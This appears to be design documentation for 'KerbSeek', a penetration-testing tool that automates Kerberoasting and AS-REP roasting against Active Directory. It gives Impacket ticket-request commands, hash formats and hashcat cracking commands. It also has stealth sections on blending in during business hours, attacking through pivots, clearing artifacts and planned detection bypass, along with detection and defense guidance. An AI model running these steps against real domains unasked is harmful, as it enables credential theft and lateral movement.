# KerbSeek Technical Summary

## Overview
KerbSeek is a specialized Kerberos attack automation tool that performs Kerberoasting and ASREPRoasting attacks to extract and crack service account credentials from Active Directory environments.

## Architecture

### Core Components
1. **Port Scanner**: Identifies Kerberos services (ports 88, 464)
2. **TGS Requester**: Requests Ticket Granting Service tickets for SPNs
3. **AS-REP Requester**: Requests AS-REP tickets for accounts without pre-auth
4. **Hash Extractor**: Parses and formats tickets for offline cracking
5. **Encryption Analyzer**: Identifies ticket encryption types (RC4, AES128, AES256)

### Tool Integration
- **Impacket**: GetUserSPNs.py, GetNPUsers.py
- **Hashcat**: Modes 13100 (Kerberoast), 18200 (ASREPRoast)
- **John the Ripper**: Compatible hash formats
- **ldapsearch**: Domain enumeration

## Attack Methodologies

### Kerberoasting
**Technique**: Request TGS tickets for Service Principal Names (SPNs)

**Requirements**:
- Valid domain credentials (any user)
- Network access to Domain Controller
- Target accounts with SPNs configured

**Process**:
1. Authenticate to Domain Controller using provided credentials
2. Query LDAP for accounts with servicePrincipalName attribute
3. Request TGS ticket for each SPN using Kerberos protocol
4. Extract and decode TGS-REP messages from responses
5. Parse encrypted part of ticket (contains service account hash)
6. Format hash for offline cracking (Hashcat/John)

**Technical Details**:
```
Request:  KRB_TGS_REQ (service ticket request)
Response: KRB_TGS_REP (encrypted with service account hash)
Format:   $krb5tgs$23$*user$realm$SPN*$hash_data
```

**Encryption Types**:
- **RC4-HMAC (23)**: MD4 hash of password, fastest to crack
- **AES128-CTS-HMAC-SHA1-96 (17)**: More secure, slower to crack
- **AES256-CTS-HMAC-SHA1-96 (18)**: Most secure, slowest to crack

**Detection Avoidance**:
- Requests appear as normal Kerberos traffic
- No failed authentication attempts
- Single TGS request per SPN (low volume)
- Uses legitimate Kerberos protocol flows

### ASREPRoasting
**Technique**: Request AS-REP for accounts without Kerberos pre-authentication

**Requirements**:
- NO credentials needed
- Network access to Domain Controller
- Target accounts with "Do not require Kerberos preauthentication" flag

**Process**:
1. Send AS-REQ message to KDC for target username
2. If pre-auth disabled, KDC responds with AS-REP
3. AS-REP contains encrypted timestamp (encrypted with user's password hash)
4. Extract encrypted part from AS-REP message
5. Format hash for offline cracking

**Technical Details**:
```
Request:  KRB_AS_REQ (authentication service request, no pre-auth)
Response: KRB_AS_REP (encrypted with user's password hash)
Format:   $krb5asrep$23$user@realm$hash_data
```

**Vulnerable Configuration**:
```
UserAccountControl: DONT_REQ_PREAUTH (0x400000)
```

**Common Targets**:
- Service accounts with legacy settings
- Application accounts
- Accounts migrated from old domains
- Misconfigured accounts

## Implementation Details

### Port Scanning Logic
```python
def check_kerberos_port(dc_ip, port=88, timeout=3):
    # TCP connect to port 88 (Kerberos)
    # Returns True if open, False otherwise
    - Timeout: 3 seconds default
    - Non-blocking socket operations
    - Handles connection refused gracefully
```

### TGS Ticket Request (Kerberoasting)
```python
def request_tgs_ticket_impacket(domain, username, spn, dc_ip, 
                                 user_for_auth, password, timeout=30):
    # Uses Impacket's GetUserSPNs.py
    # Command: GetUserSPNs.py -request -dc-ip <DC> <domain>/<user>:<pass>
    
    Process:
    1. Authenticate with domain credentials
    2. Request TGS for specified SPN
    3. Parse response for Kerberos hash
    4. Extract encryption type from hash format
    5. Return structured result dict
    
    Regex Pattern: r'\$krb5tgs\$23\$[^\s]+'
    Encryption Detection:
        - $23$ = RC4-HMAC
        - $17$ = AES128
        - $18$ = AES256
```

### AS-REP Request (ASREPRoasting)
```python
def request_asrep_ticket_impacket(domain, username, dc_ip, timeout=30):
    # Uses Impacket's GetNPUsers.py
    # Command: GetNPUsers.py <domain>/ -usersfile - -format hashcat -dc-ip <DC> -no-pass
    
    Process:
    1. Send AS-REQ without pre-authentication data
    2. Check if KDC responds with AS-REP (vulnerability indicator)
    3. Extract encrypted timestamp from AS-REP
    4. Format for Hashcat mode 18200
    5. Return hash if successful
    
    Regex Pattern: r'\$krb5asrep\$23\$[^\s]+'
```

### Concurrent Execution
```python
with ThreadPoolExecutor(max_workers=args.workers) as executor:
    # Submit tasks for each user/SPN
    futures = []
    for user in users:
        future = executor.submit(attack_function, user, ...)
        futures.append(future)
    
    # Process results as completed
    for future in as_completed(futures):
        result = future.result()
        # Handle success/failure
```

**Threading Details**:
- Default: 10 concurrent workers
- Configurable via `-w` parameter
- Thread-safe result collection
- Graceful exception handling per thread

## Output Formats

### kerblist.txt (Vulnerable Accounts)
```
domain\svc-sql
domain\svc-web
domain\app-account
```

### tgs_hashes.txt (Kerberoast Hashes)
```
$krb5tgs$23$*svc-sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$abc123...def789
$krb5tgs$23$*svc-web$CORP.LOCAL$HTTP/web.corp.local*$123abc...789def
```

**Format Breakdown**:
- `$krb5tgs$` - Kerberos 5 TGS-REP identifier
- `23` - Encryption type (RC4-HMAC)
- `*svc-sql$CORP.LOCAL$MSSQLSvc/...` - Username, realm, SPN
- `*$abc123...` - Encrypted ticket data (hex)

### asrep_hashes.txt (ASREPRoast Hashes)
```
$krb5asrep$23$user@CORP.LOCAL:abc123def456...
$krb5asrep$23$jdoe@CORP.LOCAL:123456789abc...
```

**Format Breakdown**:
- `$krb5asrep$` - Kerberos 5 AS-REP identifier
- `23` - Encryption type
- `user@CORP.LOCAL` - Username and realm
- `:abc123...` - Encrypted timestamp data (hex)

### kerb_details.json (Structured Export)
```json
{
  "scan_time": "2025-10-13T14:32:10",
  "domain": "CORP.LOCAL",
  "dc_ip": "10.0.0.1",
  "results": [
    {
      "username": "svc-sql",
      "attack_type": "kerberoast",
      "spn": "MSSQLSvc/sql01.corp.local:1433",
      "hash": "$krb5tgs$23$*...",
      "encryption": "RC4-HMAC",
      "status": "success"
    }
  ],
  "summary": {
    "total_tested": 50,
    "kerberoast_success": 5,
    "asreproast_success": 2,
    "rc4_tickets": 4,
    "aes_tickets": 3
  }
}
```

## Kerberos Protocol Details

### Ticket Request Flow
```
Client              KDC (Domain Controller)         Service
  |                          |                         |
  |--- AS-REQ -------------->|                         |
  |    (username)            |                         |
  |                          |                         |
  |<-- AS-REP ---------------|                         |
  |    (TGT encrypted)       |                         |
  |                          |                         |
  |--- TGS-REQ ------------->|                         |
  |    (TGT + SPN)           |                         |
  |                          |                         |
  |<-- TGS-REP --------------|                         |
  |    (Service Ticket)      |                         |
  |                                                    |
  |--- AP-REQ ------------------------------------->   |
  |    (Service Ticket)                                |
```

### Attack Points
- **ASREPRoasting**: Exploits missing pre-auth at AS-REQ stage
- **Kerberoasting**: Extracts hash from TGS-REP ticket

### Encryption Algorithm (RC4-HMAC)
```
1. Password -> Unicode (UTF-16LE)
2. MD4(password_unicode) -> NTLM hash
3. HMAC-MD5(NTLM_hash, KRB5_data) -> Ticket encryption key
4. RC4(ticket_data, encryption_key) -> Encrypted ticket
```

**Cracking Process**:
```
1. Extract encrypted ticket from TGS-REP
2. Brute force password candidates
3. For each candidate: MD4(password) -> NTLM
4. HMAC-MD5(NTLM, ticket_data) -> test_key
5. RC4_decrypt(ticket, test_key) -> plaintext
6. Check if plaintext matches expected structure
7. If valid structure: PASSWORD FOUND
```

## Hashcat Integration

### Mode 13100 (Kerberoast)
```bash
hashcat -m 13100 tgs_hashes.txt wordlist.txt

# Hash format: $krb5tgs$23$*user$realm$spn*$hash
# Cracks: Service account passwords
# Speed: ~1-10 GH/s (GPU dependent)
```

**Optimization**:
- Use rules: `-r best64.rule`
- Prioritize RC4: Faster than AES
- Wordlist + rules before brute force
- Target short passwords first: `-a 3 ?u?l?l?l?d?d?d`

### Mode 18200 (ASREPRoast)
```bash
hashcat -m 18200 asrep_hashes.txt wordlist.txt

# Hash format: $krb5asrep$23$user@realm:hash
# Cracks: User account passwords
# Speed: Similar to mode 13100
```

## Detection & Defense

### Detection Indicators
**Kerberoasting**:
- Event ID 4769: Kerberos Service Ticket Request
  - Look for: Ticket encryption type 0x17 (RC4)
  - Look for: Multiple TGS requests from single account
  - Look for: Requests for unusual SPNs

**ASREPRoasting**:
- Event ID 4768: Kerberos Authentication Ticket (TGT) Request
  - Look for: Pre-authentication type 0 (no pre-auth)
  - Look for: Multiple failed/unusual AS-REQ patterns

### Defense Measures
1. **Set strong passwords** for service accounts (25+ characters)
2. **Enable pre-authentication** for all accounts
3. **Use Managed Service Accounts** (MSAs/gMSAs)
4. **Prefer AES encryption** over RC4 (Group Policy)
5. **Monitor Event IDs** 4768, 4769 for anomalies
6. **Implement honeypot accounts** with attractive SPNs
7. **Regular password rotation** for service accounts
8. **Principle of least privilege** for SPN accounts

### Group Policy Settings
```
Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options
- Network security: Configure encryption types allowed for Kerberos
  ✅ AES128_HMAC_SHA1
  ✅ AES256_HMAC_SHA1
  ❌ RC4_HMAC_MD5 (disable if possible)
```

## Performance Characteristics

### Timing Analysis
- **Port scan**: ~50-100 hosts/second (TCP connect)
- **TGS request**: ~1-2 seconds per SPN
- **AS-REP request**: ~0.5-1 second per user
- **Hash extraction**: Milliseconds
- **Concurrent workers**: 10 threads default (configurable)

### Resource Usage
- **Memory**: ~20-50 MB (baseline)
- **Network**: Low bandwidth (<1 KB per request)
- **CPU**: Minimal (waiting on network I/O)
- **Disk**: Output files typically <1 MB

### Scalability
- **Small environment** (50 SPNs): ~2 minutes
- **Medium environment** (500 SPNs): ~15 minutes
- **Large environment** (5000 SPNs): ~2 hours
- **Bottleneck**: Network latency + DC response time

## Error Handling

### Common Errors
```python
# Clock skew error
Error: "KDC_ERR_CLIENT_SKEW"
Solution: Sync time with DC (±5 minutes required)

# Authentication failed
Error: "KRB_AP_ERR_BAD_INTEGRITY"
Solution: Verify username/password credentials

# Pre-auth required
Error: "KDC_ERR_PREAUTH_REQUIRED"
Solution: Account has pre-auth enabled (not vulnerable to ASREPRoast)

# No such user
Error: "KDC_ERR_C_PRINCIPAL_UNKNOWN"
Solution: Username doesn't exist in domain

# Service not found
Error: "KDC_ERR_S_PRINCIPAL_UNKNOWN"
Solution: SPN not registered in domain
```

### Exception Handling
- **Connection timeout**: Graceful skip, continue with next target
- **Missing dependencies**: Clear error message, suggest installation
- **Invalid credentials**: Fail fast, don't retry
- **File I/O errors**: Log warning, continue execution

## Dependencies

### Required
- Python 3.6+
- `socket` (standard library)
- `subprocess` (standard library)
- `re` (standard library)

### Optional (Recommended)
- **impacket-scripts**: GetUserSPNs.py, GetNPUsers.py
- **ldap-utils**: ldapsearch for domain enumeration
- **hashcat**: Offline hash cracking
- **john**: Alternative hash cracking

### Installation
```bash
# Ubuntu/Debian
apt install python3-impacket ldap-utils hashcat

# Python packages
pip install impacket

# Verify installation
which GetUserSPNs.py
which GetNPUsers.py
```

## Output File Naming Convention
```
kerblist.txt              # Vulnerable accounts list
tgs_hashes.txt            # Kerberoasting hashes (Hashcat 13100)
asrep_hashes.txt          # ASREPRoasting hashes (Hashcat 18200)
tickets.txt               # Raw ticket data (base64)
kerb_details.txt          # Human-readable report
kerb_details.json         # Machine-parseable JSON
tgs_<username>.txt        # Individual TGS ticket files (temp)
```

## Security Considerations

### Operational Security
- **Use VPN/pivot**: Don't attack from public IP
- **Rate limiting**: Use `-w 5` for slower, stealthier attacks
- **Time windows**: Attack during business hours (blend in)
- **Clean artifacts**: Remove temporary ticket files

### Legal Compliance
- **Authorization required**: Only test authorized systems
- **Scope limitations**: Stay within engagement boundaries
- **Data handling**: Secure storage of captured hashes
- **Reporting**: Document all activities and findings

## Use Cases

### Penetration Testing
1. **Initial access**: ASREPRoast without credentials
2. **Privilege escalation**: Kerberoast to find weak service accounts
3. **Lateral movement**: Crack service accounts for additional access
4. **Red team operations**: Simulate real-world attacks

### Security Auditing
1. **Configuration review**: Identify accounts without pre-auth
2. **Password strength testing**: Crack hashes to find weak passwords
3. **Compliance validation**: Ensure encryption standards (AES vs RC4)
4. **Risk assessment**: Quantify exposure from SPN misconfigurations

### Purple Team Exercises
1. **Detection testing**: Verify SIEM alerts on ticket requests
2. **Response validation**: Test incident response procedures
3. **Honeypot effectiveness**: Check if decoy accounts are discovered
4. **Baseline establishment**: Normal vs malicious traffic patterns

## Limitations

### Technical Constraints
- **Requires Impacket**: Tool dependency for ticket requests
- **Python 3.6+ only**: No Python 2 support
- **Linux/Unix focused**: Windows support via WSL
- **Network required**: Cannot work offline

### Functional Limitations
- **No automatic LDAP enumeration**: Manual SPN discovery required
- **Single domain focus**: No forest trust traversal
- **No password cracking**: Hash cracking done separately
- **Limited stealth options**: No traffic obfuscation

## Future Enhancements
- Native Kerberos implementation (remove Impacket dependency)
- Automatic SPN enumeration via LDAP queries
- Integrated hash cracking with GPU support
- Cross-domain trust exploitation
- Traffic obfuscation and evasion techniques
- Real-time detection bypass capabilities

## References
- RFC 4120: Kerberos Network Authentication Service (V5)
- MITRE ATT&CK T1558.003: Kerberoasting
- MITRE ATT&CK T1558.004: AS-REP Roasting
- Microsoft: Kerberos Authentication Overview
- Impacket GitHub: https://github.com/SecureAuthCorp/impacket
- Hashcat Documentation: https://hashcat.net/wiki/
